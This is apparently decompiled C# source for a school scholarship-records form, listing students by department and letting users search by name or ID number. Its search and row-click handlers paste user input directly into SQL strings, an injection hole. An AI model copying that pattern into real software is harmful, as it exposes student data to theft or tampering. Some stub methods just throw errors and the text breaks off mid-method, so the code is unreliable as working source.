		val2.set_Alignment((DataGridViewContentAlignment)16);
		val2.set_BackColor(Color.SeaGreen);
		val2.set_Font(new Font("Franklin Gothic Demi", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val2.set_ForeColor(Color.White);
		val2.set_SelectionBackColor(SystemColors.Highlight);
		val2.set_SelectionForeColor(SystemColors.HighlightText);
		val2.set_WrapMode((DataGridViewTriState)1);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "ColumnHeadersDefaultCellStyle", new object[1] { val2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "ColumnHeadersHeightSizeMode", new object[1] { (object)(DataGridViewColumnHeadersHeightSizeMode)2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "AddRange", new object[1] { new DataGridViewColumn[7]
		{
			(DataGridViewColumn)StudidDataGridViewTextBoxColumn,
			(DataGridViewColumn)StudFnameDataGridViewTextBoxColumn,
			(DataGridViewColumn)StudLnameDataGridViewTextBoxColumn,
			(DataGridViewColumn)Column1,
			(DataGridViewColumn)StudmidIDataGridViewTextBoxColumn,
			(DataGridViewColumn)sy,
			(DataGridViewColumn)level
		} }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "Dock", new object[1] { (object)(DockStyle)5 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "DoubleBuffered", new object[1] { true }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "EnableHeadersVisualStyles", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "HeaderBgColor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "HeaderForeColor", new object[1] { Color.White }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "Location", new object[1]
		{
			new Point(0, 0)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "Name", new object[1] { "dg_StudScholarRec" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "RowHeadersBorderStyle", new object[1] { (object)(DataGridViewHeaderBorderStyle)4 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "RowHeadersVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "SelectionMode", new object[1] { (object)(DataGridViewSelectionMode)1 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "Size", new object[1]
		{
			new Size(557, 418)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "TabIndex", new object[1] { 53 }, (string[])null, (Type[])null, false, true);
		((DataGridViewColumn)StudidDataGridViewTextBoxColumn).set_HeaderText("stud_id");
		((DataGridViewColumn)StudidDataGridViewTextBoxColumn).set_Name("StudidDataGridViewTextBoxColumn");
		((DataGridViewColumn)StudidDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)StudidDataGridViewTextBoxColumn).set_Visible(false);
		((DataGridViewColumn)StudFnameDataGridViewTextBoxColumn).set_HeaderText("First Name");
		((DataGridViewColumn)StudFnameDataGridViewTextBoxColumn).set_Name("StudFnameDataGridViewTextBoxColumn");
		((DataGridViewColumn)StudFnameDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)StudLnameDataGridViewTextBoxColumn).set_HeaderText("Last Name");
		((DataGridViewColumn)StudLnameDataGridViewTextBoxColumn).set_Name("StudLnameDataGridViewTextBoxColumn");
		((DataGridViewColumn)StudLnameDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)Column1).set_HeaderText("M.I");
		((DataGridViewColumn)Column1).set_Name("Column1");
		((DataGridViewColumn)Column1).set_ReadOnly(true);
		((DataGridViewColumn)Column1).set_Visible(false);
		((DataGridViewColumn)StudmidIDataGridViewTextBoxColumn).set_HeaderText("Scholar Type");
		((DataGridViewColumn)StudmidIDataGridViewTextBoxColumn).set_Name("StudmidIDataGridViewTextBoxColumn");
		((DataGridViewColumn)StudmidIDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)sy).set_HeaderText("SY");
		((DataGridViewColumn)sy).set_Name("sy");
		((DataGridViewColumn)sy).set_ReadOnly(true);
		((DataGridViewColumn)sy).set_Visible(false);
		((DataGridViewColumn)level).set_HeaderText("Level");
		((DataGridViewColumn)level).set_Name("level");
		((DataGridViewColumn)level).set_ReadOnly(true);
		((DataGridViewColumn)level).set_Visible(false);
		((Control)Panel2).get_Controls().Add((Control)(object)cbo_SelectDept);
		((Control)Panel2).get_Controls().Add((Control)(object)Label14);
		((Control)Panel2).set_Dock((DockStyle)1);
		((Control)Panel2).set_Font(new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Panel2).set_Location(new Point(0, 0));
		((Control)Panel2).set_Name("Panel2");
		((Control)Panel2).set_Size(new Size(1064, 70));
		((Control)Panel2).set_TabIndex(51);
		cbo_SelectDept.set_DropDownStyle((ComboBoxStyle)2);
		((Control)cbo_SelectDept).set_Font(new Font("Franklin Gothic Medium Cond", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ListControl)cbo_SelectDept).set_FormattingEnabled(true);
		cbo_SelectDept.get_Items().AddRange(new object[4] { "COLLEGE DEPARTMENT", "ELEMENTARY DEPARTMENT", "SENIOR-HIGH DEPARTMENT", "JUNIOR-HIGH DEPARTMENT" });
		((Control)cbo_SelectDept).set_Location(new Point(489, 17));
		((Control)cbo_SelectDept).set_Name("cbo_SelectDept");
		((Control)cbo_SelectDept).set_Size(new Size(282, 33));
		((Control)cbo_SelectDept).set_TabIndex(8);
		Label14.set_AutoSize(true);
		((Control)Label14).set_Font(new Font("Franklin Gothic Medium Cond", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label14.set_ImeMode((ImeMode)0);
		((Control)Label14).set_Location(new Point(294, 20));
		((Control)Label14).set_Name("Label14");
		((Control)Label14).set_Size(new Size(189, 25));
		((Control)Label14).set_TabIndex(8);
		Label14.set_Text("SELECT DEPARTMENT");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Control)this).get_Controls().Add((Control)(object)Label11);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)FlowLayoutPanel1);
		((Control)this).set_Name("frm_sSG");
		((Control)this).set_Size(new Size(1064, 664));
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox2).PerformLayout();
		((Control)GroupBox3).ResumeLayout(false);
		((Control)GroupBox3).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)FlowLayoutPanel1).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((ISupportInitialize)dg_StudScholarRec).EndInit();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void Xr81Np()
	{
		if (cbo_SelectDept.get_SelectedIndex() == 0)
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "stud_id" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "stud_fname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "stud_lname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "stud_midI" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "scholar_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sy_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "yl_name" }, (string[])null, (Type[])null, false, true);
			lbl_level.set_Text("YEAR LEVEL");
			((Control)lbl_course).set_Visible(true);
			((Control)lbl_sem).set_Visible(true);
			((Control)txtb_studCourse).set_Visible(true);
			((Control)txtb_studSem).set_Visible(true);
			string dw4g1F = "select s.stud_id,s.stud_fname,s.stud_lname,s.stud_midI,st.scholar_name,sy.sy_name,yl.yl_name  from tbl_student s  inner join tbl_sch_year sy  on s.sy_id=sy.sy_id inner join tbl_year_level yl on s.yl_id=yl.yl_id  inner join tbl_coll_scholarlist sl on sl.stud_id=s.stud_id inner join tbl_scholar_type st on sl.sl_name=st.scholar_id order by stud_lname asc";
			x7Y6Jd(dw4g1F, RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
			Mi37Pn(RuntimeHelpers.GetObjectValue(scholar_list), cbo_scholarType);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 1)
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "estud_id" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "estud_fname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "estud_lname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "estud_mi" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "scholar_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "esy_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "egl_name" }, (string[])null, (Type[])null, false, true);
			lbl_level.set_Text("GRADE LEVEL");
			((Control)lbl_course).set_Visible(false);
			((Control)lbl_sem).set_Visible(false);
			((Control)txtb_studCourse).set_Visible(false);
			((Control)txtb_studSem).set_Visible(false);
			string dw4g1F2 = "select s.estud_id,s.estud_fname,s.estud_lname,s.estud_mi,st.scholar_name ,sy.esy_name,gl.egl_name from tbl_elem_students  s inner join tbl_elem_sy sy  on sy.esy_id=s.esy_id inner join tbl_elem_gradelevel gl on  s.egl_id=gl.egl_id  inner join tbl_elem_scholarlist sl on sl.stud_id=s.estud_id  inner join tbl_scholar_type st on sl.sl_name=st.scholar_id order by s.estud_lname asc";
			x7Y6Jd(dw4g1F2, RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
			Mi37Pn(RuntimeHelpers.GetObjectValue(scholar_list), cbo_scholarType);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 2)
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sstud_id" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sstud_fname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sstud_lname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sstud_mi" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "scholar_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "ssy_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "sgl_name" }, (string[])null, (Type[])null, false, true);
			lbl_level.set_Text("GRADE LEVEL");
			((Control)lbl_course).set_Visible(false);
			((Control)lbl_sem).set_Visible(false);
			((Control)txtb_studCourse).set_Visible(false);
			((Control)txtb_studSem).set_Visible(false);
			string dw4g1F3 = "select  s.sstud_id,s.sstud_fname,s.sstud_lname,s.sstud_mi,st.scholar_name,sy.ssy_name,gl.sgl_name from tbl_seniorhigh_students  s inner join tbl_seniorhigh_sy sy  on s.ssy_id=sy.ssy_id inner join tbl_seniorhigh_gl gl on s.sgl_id=gl.sgl_id inner join tbl_senior_scholarlist sl on sl.stud_id=s.sstud_id inner join tbl_scholar_type st on sl.sl_name=st.scholar_id order by s.sstud_lname asc";
			x7Y6Jd(dw4g1F3, RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
			Mi37Pn(RuntimeHelpers.GetObjectValue(scholar_list), cbo_scholarType);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 3)
		{
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jstud_id" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jstud_fname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jstud_lname" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jstud_mi" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "scholar_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jsy_name" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(dg_StudScholarRec, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "DataPropertyName", new object[1] { "jgl_name" }, (string[])null, (Type[])null, false, true);
			lbl_level.set_Text("GRADE LEVEL");
			((Control)txtb_studCourse).set_Visible(false);
			((Control)txtb_studSem).set_Visible(false);
			string dw4g1F4 = "select  s.jstud_id,s.jstud_fname,s.jstud_lname,s.jstud_mi,st.scholar_name,sy.jsy_name,gl.jgl_name from tbl_juniorhigh_students s inner join tbl_juniorhigh_sy sy  on s.jsy_id=sy.jsy_id inner join tbl_juniorhigh_gradelevel gl on s.jgl_id=gl.jgl_id  inner join tbl_elem_scholarlist sl on sl.stud_id=s.jstud_id inner join tbl_scholar_type st on sl.sl_name=st.scholar_id order by s.jstud_lname asc";
			x7Y6Jd(dw4g1F4, RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
			Mi37Pn(RuntimeHelpers.GetObjectValue(scholar_list), cbo_scholarType);
		}
	}

	private void Mi37Pn(object y5KFz1, ComboBox Yt4z0C)
	{
		throw new NotImplementedException();
	}

	private void x7Y6Jd(string Dw4g1F, object Jj80Pz)
	{
		throw new NotImplementedException();
	}

	private void w1DKb3(object sender, EventArgs e)
	{
		cbo_scholarType.set_SelectedIndex(-1);
		((TextBoxBase)txtb_ScholarAmnt).Clear();
		Xr81Np();
	}

	private void Xj1y3F(object sender, KeyEventArgs e)
	{
		//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
		string text = cbo_SearchBy.get_SelectedItem().ToString();
		if (Operators.CompareString(text, "Name", false) == 0)
		{
			switch (cbo_SelectDept.get_SelectedIndex())
			{
			case 0:
				x7Y6Jd("select s.stud_id,s.stud_fname,s.stud_lname,s.stud_midI,st.scholar_name,sy.sy_name,yl.yl_name from tbl_student s  inner join tbl_sch_year sy  on s.sy_id=sy.sy_id inner join tbl_year_level yl on s.yl_id=yl.yl_id left join tbl_coll_scholarlist sl on sl.stud_id=s.stud_id  left join tbl_scholar_type st on sl.sl_name=st.scholar_id  where stud_Lname Like '%" + txtb_Search.get_Text() + "%' or stud_Fname  Like '%" + txtb_Search.get_Text() + "%' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 1:
				x7Y6Jd("select s.estud_id,s.estud_fname,s.estud_lname,s.estud_mi,st.scholar_name ,sy.esy_name,gl.egl_name from tbl_elem_students  s inner join tbl_elem_sy sy  on sy.esy_id=s.esy_id inner join tbl_elem_gradelevel gl on  s.egl_id=gl.egl_id    left join tbl_elem_scholarlist sl on sl.stud_id=estud_id  left join tbl_scholar_type st on sl.sl_name=st.scholar_id where estud_lname Like '%" + txtb_Search.get_Text() + "%' or estud_fname  Like '%" + txtb_Search.get_Text() + "%' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 2:
				x7Y6Jd("select  s.sstud_id,s.sstud_fname,s.sstud_lname,s.sstud_mi,st.scholar_name,sy.ssy_name,gl.sgl_name from tbl_seniorhigh_students  s inner join tbl_seniorhigh_sy sy  on s.ssy_id=sy.ssy_id inner join tbl_seniorhigh_gl gl on s.sgl_id=gl.sgl_id  left join tbl_senior_scholarlist sl on sl.stud_id=sstud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id where sstud_lname Like '%" + txtb_Search.get_Text() + "%' or sstud_fname  Like '%" + txtb_Search.get_Text() + "%' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 3:
				x7Y6Jd("select  s.jstud_id,s.jstud_fname,s.jstud_lname,s.jstud_mi,st.scholar_name,sy.jsy_name,gl.jgl_name from tbl_juniorhigh_students s inner join tbl_juniorhigh_sy sy  on s.jsy_id=sy.jsy_id inner join tbl_juniorhigh_gradelevel gl on s.jgl_id=gl.jgl_id  left join tbl_junior_scholarlist sl on sl.stud_id=jstud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id where jstud_lname Like '%" + txtb_Search.get_Text() + "%' or jstud_fname  Like '%" + txtb_Search.get_Text() + "%' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			}
		}
		else if (Operators.CompareString(text, "ID Number", false) == 0)
		{
			switch (cbo_SelectDept.get_SelectedIndex())
			{
			case 0:
				x7Y6Jd(" select s.stud_id,s.stud_fname,s.stud_lname,s.stud_midI,st.scholar_name,sy.sy_name,yl.yl_name from tbl_student s  inner join tbl_sch_year sy  on s.sy_id=sy.sy_id inner join tbl_year_level yl on s.yl_id=yl.yl_id  left join tbl_coll_scholarlist sl on sl.stud_id=stud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id where stud_id Like '" + txtb_Search.get_Text() + "%' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 1:
				x7Y6Jd("select s.estud_id,s.estud_fname,s.estud_lname,s.estud_mi,st.scholar_name ,sy.esy_name,gl.egl_name from tbl_elem_students  s inner join tbl_elem_sy sy  on sy.esy_id=s.esy_id inner join tbl_elem_gradelevel gl on  s.egl_id=gl.egl_id    left join tbl_elem_scholarlist sl on sl.stud_id=estud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id where estud_id='" + txtb_Search.get_Text() + "' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 2:
				x7Y6Jd("select  s.sstud_id,s.sstud_fname,s.sstud_lname,s.sstud_mi,st.scholar_name,sy.ssy_name,gl.sgl_name from tbl_seniorhigh_students  s inner join tbl_seniorhigh_sy sy  on s.ssy_id=sy.ssy_id inner join tbl_seniorhigh_gl gl on s.sgl_id=gl.sgl_id  left join tbl_senior_scholarlist sl on sl.stud_id=sstud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id  where sstud_id='" + txtb_Search.get_Text() + "' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			case 3:
				x7Y6Jd("select  s.jstud_id,s.jstud_fname,s.jstud_lname,s.jstud_mi,st.scholar_name,sy.jsy_name,gl.jgl_name from tbl_juniorhigh_students s inner join tbl_juniorhigh_sy sy  on s.jsy_id=sy.jsy_id inner join tbl_juniorhigh_gradelevel gl on s.jgl_id=gl.jgl_id   left join tbl_junior_scholarlist sl on sl.stud_id=s.jstud_id left join tbl_scholar_type st on sl.sl_name=st.scholar_id where jstud_id='" + txtb_Search.get_Text() + "' ", RuntimeHelpers.GetObjectValue(dg_StudScholarRec));
				break;
			}
		}
		else if (Operators.CompareString(text, Conversions.ToString(false), false) == 0)
		{
			MessageBox.Show("");
		}
	}

	public void Zy69Cr(object sender, EventArgs e)
	{
		cbo_SearchBy.set_SelectedIndex(1);
		Mi37Pn(RuntimeHelpers.GetObjectValue(scholar_list), cbo_scholarType);
	}

	private void i0C5Xj(object sender, DataGridViewCellEventArgs e)
	{
		//IL_0d8e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = e.get_RowIndex();
			object obj = dg_StudScholarRec;
			cbo_scholarType.set_SelectedIndex(-1);
			txtb_ScholarAmnt.set_Text(Conversions.ToString(0));
			((TextBoxBase)txtb_refNo).Clear();
			object obj2 = obj;
			object[] obj3 = new object[2] { 0, num };
			object[] array = obj3;
			bool[] obj4 = new bool[2] { false, true };
			bool[] array2 = obj4;
			object obj5 = NewLateBinding.LateGet(obj2, (Type)null, "Item", obj3, (string[])null, (Type[])null, obj4);
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			string f6C7Ad = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select c.crs_name from tbl_coll_course  c inner join tbl_student sc on sc.crs_id=c.crs_id  where sc.stud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			string f6C7Ad2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select sm.sem_name from tbl_semester sm inner join tbl_student s on s.sem_id=sm.sem_id where s.stud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select sl.sl_amnt,sl.sl_status  from  tbl_coll_scholarlist sl inner join tbl_student s on sl.stud_id=s.stud_id where s.stud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select sl.sl_amnt,sl.sl_status  from  tbl_coll_scholarlist sl inner join tbl_elem_students s on sl.stud_id=s.estud_id where s.estud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select sl.sl_amnt,sl.sl_status  from  tbl_coll_scholarlist sl inner join tbl_seniorhigh_students s on sl.stud_id=s.sstud_id where s.sstud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select sl.sl_amnt,sl.sl_status  from  tbl_coll_scholarlist sl inner join tbl_juniorhigh_students s on sl.stud_id=s.jstud_id where s.jstud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			string f6C7Ad3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Select ifnull(sl.reference_no,'N/a') as ref_no from  tbl_coll_scholarlist sl inner join tbl_student s on sl.stud_id=s.stud_id where s.stud_id='", NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			b6K2Fd("db_lccsams");
			TextBox obj6 = txtb_studid;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 0, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj6.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
